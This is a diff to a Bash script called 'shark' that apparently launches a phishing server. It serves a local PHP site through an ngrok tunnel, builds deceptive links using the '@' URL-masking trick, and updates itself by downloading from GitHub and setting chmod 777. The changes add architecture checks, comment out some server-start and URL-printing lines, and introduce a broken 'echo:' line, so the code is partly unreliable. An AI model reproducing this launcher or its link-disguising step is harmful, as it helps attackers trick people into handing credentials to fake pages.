@@ -58,6 +58,7 @@ error_msg() {
 #######
 
 arch=`uname -m`
+ArNam=$(dpkg --print-architecture)
 
 #spinner
 spinner() {
@@ -117,15 +118,13 @@ function os () {
 		shark="${PREFIX}/share/shark"
                 old_shark="${PREFIX}/bin/shark"
 		OS=TERMUX
-                export user=$HOME
-                authtoken
 	fi
 }
 
 
 function main_update() {
 	launch="updating shark"
-	splashdown="updated shark";echo
+	splashdown="updated shark";echo:
 	os;(wget -q https://github.com/Bhaviktutorials/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
 }
 
@@ -227,8 +226,12 @@ function fix_ngrok() {
 		elif [[ "$arch" == *'aarch64'* ]]; then
 			ngrok_url="https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip"
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
-		else
+                        if [[ "$ArNam" == *'amd64'* ]]; then
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
+                        else
+                              ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
+		        fi
+                else
 			ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
 	fi
 	(wget --quiet ${ngrok_url} -O ngrok.zip) & spinner
@@ -346,7 +349,7 @@ function url_shortner() {
 	printf "${green}shark ${white}>> ${white}Don't use space in your words\n"	
         read -p $'\e[1;92mshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
         final_url=$mask-$words@$shorter
-	printf "$final_url\n"
+	#printf "$final_url\n"
 }
 
 # MAIN 
@@ -363,21 +366,22 @@ echo
 echo -e ${red}"Bro you didn't mentioned anything."
 echo
 echo -e ${green}"restarting your option No.$option...."
-sleep 2
+sleep 1
+clear
 main
 fi
-launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
+#launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
 elif [[ $drk == n || $drk == N ]]; then
 PORT="8080"
-launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
+#launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
 else
 	echo
-	echo -e ${red}"bro you type wrong..."
-	sleep 2
+	echo -e ${red}"Wrong Input..."
+	sleep 1
+        clear
 	main
 fi
-
-#launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 0.1;ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
+launch="starting shark server"; splashdown="started shark server";printf "\n"; connection;php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & sleep 20 & spinner;ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io");url_shortner;
 }
 
 #banner2
